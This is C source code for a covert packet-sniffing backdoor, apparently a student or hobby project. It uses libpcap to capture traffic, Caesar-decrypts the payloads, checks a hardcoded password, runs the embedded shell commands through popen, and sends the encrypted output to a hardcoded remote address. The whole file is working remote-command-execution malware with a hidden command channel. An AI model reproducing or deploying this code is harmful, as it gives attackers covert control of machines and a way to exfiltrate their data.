#include "pktcap.h"

int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst, char * src_host, int port){
	
	char nic_dev[BUFFER];		// NIC device name to monitor
	pcap_if_t *alldevs, *temp; 	// NIC list variables
    	char errbuf[PCAP_ERRBUF_SIZE]; 	// error buffer
    	bpf_u_int32 maskp;          	// subnet mask               
    	bpf_u_int32 netp;           	// ip 
    	char filter_exp[BUFFER];	// filter expression
	
    
    	/* Get all network interfaces */
    	if(pcap_findalldevs (&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error finding all devs: %s\n", errbuf);
		exit(1);
	}
	/* monitor the specified interface */
	for(temp = alldevs; temp; temp = temp->next)
	{
		if(strcmp(NETWORK_INT, temp->name) == 0)
			strcpy(nic_dev, temp->name);
	}

	if(pcap_lookupnet(nic_dev, &netp, &maskp, errbuf) < 0)
	{
		fprintf(stderr, "Error looking up IP/Netmask for device.\n");
		exit(1);
	}
	if((nic_descr = pcap_open_live(nic_dev, PKT_SIZE, 1, -1, errbuf)) == NULL)
	{
		fprintf(stderr, "Cannot open device for capturing\n");
		exit(1);	
	}
	
	/* make sure we're capturing on an Ethernet device */
	if (pcap_datalink(nic_descr) != DLT_EN10MB) {
		fprintf(stderr, "%s is not an Ethernet\n", nic_dev);
		exit(EXIT_FAILURE);
	}

	/* Compiling the filter expression */
	if(dst == FROM_CLIENT)
		sprintf(filter_exp, "tcp and dst port %d", port);
	if(dst == FROM_SERVER)	
		sprintf(filter_exp, "tcp and src host %s", src_host);	
	
	if(pcap_compile(nic_descr, &fp, filter_exp, 0, netp))
	{
		fprintf(stderr, "Cannot parse expression filter\n");
		exit(1);
	}
	/* Apply the filter to the card interface */
	if(pcap_setfilter(nic_descr, &fp) < 0)
	{
		fprintf(stderr, "Cannot set filter\n");
		exit(1);
	}

	/* Use callback to process packets */
	pcap_loop(nic_descr, -1, pkt_callback, NULL);
	return 0;
}
int stopPacketCapture(pcap_t * nic_descr, struct bpf_program fp){
	pcap_freecode(&fp);
	pcap_close(nic_descr);
	return 0;
}

void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const u_char* packet)
{
	static int count = 0;
	const struct ip_struct * ip;
	const struct tcp_struct * tcp;
	const unsigned char * payload;

	int size_ip;
	int size_tcp;
	int size_payload;
	int mode;

	
	char password[strlen(PASSWORD) + 1];
	char decrypted[PKT_SIZE];
	char * command;

	count++;

	ip = (struct ip_struct *)(packet + SIZE_ETHERNET);
	size_ip = IP_HL(ip) * 4;

	if (size_ip < 20) {
		fprintf(stderr, "Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	/* print source and destination IP addresses */
	printf("       From: %s\n", inet_ntoa(ip->ip_src));
	printf("         To: %s\n", inet_ntoa(ip->ip_dst));

	if(ip->ip_p != IPPROTO_TCP)
		return;

	/* define/compute tcp header offset */
	tcp = (struct tcp_struct *)(packet + SIZE_ETHERNET + size_ip);
	size_tcp = TH_OFF(tcp) * 4;
	
	if (size_tcp < 20) {
		fprintf(stderr, "Invalid TCP header length: %u bytes\n", size_tcp);
		return;
	}

	/* define/compute tcp payload (segment) offset */
	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
	
	/* compute tcp payload (segment) size */
	size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
	printf("Size of payload: %d\n", size_payload);
	/* Decrypt the payload */
	strcpy(decrypted, ConvertCaesar(mDecipher, (char *) payload, MOD, START));

	memset(password, 0, sizeof(password));
	if(sscanf(decrypted, "%s %d", password, &mode) < 0)
	{
		fprintf(stderr, "scanning error\n");
		return;
	}
	printf("Decrypted Packet: %s\n", decrypted);
	command = parse_cmd(decrypted);

	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
	{
		fprintf(stderr, "Password Authenticated. Executing command.\n");
		send_command(command, ip, 8080);
		free(command);
		return;
	}
	else if (mode == CLIENT_MODE)
	{
		printf("%s", command);
		free(command);
		return;
	}
	else
	{
		fprintf(stderr, "Incorrect Password\n");
		return;
	}
}
char * parse_cmd(char * data)
{
	char * start, * end;
	char * command = malloc((PKT_SIZE) * sizeof(char));

	/* Point to the first occurance of pre-defined command string */
	start = strstr(data, CMD_START);

	/* Jump ahead past the pre-defined command string to point to the first
	   actual command character */
	start += strlen(CMD_START);

	/* Find the command end string, starting from the start pointer */
	end = strstr(start, CMD_END);

	memset(command, 0, PKT_SIZE);
	strncpy(command, start, (end - start));

	return command;
}

int send_command(char * command, const struct ip_struct * ip, const int dest_port)
{
	FILE *fp;

	char cmd_results[PKT_SIZE];
	char packet[PKT_SIZE];
	char encrypted[PKT_SIZE];
	if((fp = popen(command, "r")) == NULL)
	{
		fprintf(stderr, "Cannot process command.\n");
		return -1;
	}	
	while(fgets(cmd_results, PKT_SIZE - 1, fp) != NULL)
	{
		//Format packet payload
		sprintf(packet, "%s %d %s%s%s", PASSWORD, CLIENT_MODE, CMD_START, cmd_results, CMD_END);
		
		//Encrypt payload
		strcpy(encrypted, ConvertCaesar(mEncipher, packet, MOD, START));
		
		//Send it over to the client
		send_packet(encrypted, "192.168.0.2", "192.168.0.1", dest_port);
		
		memset(encrypted, 0, sizeof(encrypted));
		memset(packet, 0, sizeof(packet));
		memset(cmd_results, 0, sizeof(cmd_results));
	}
	return 0;
}
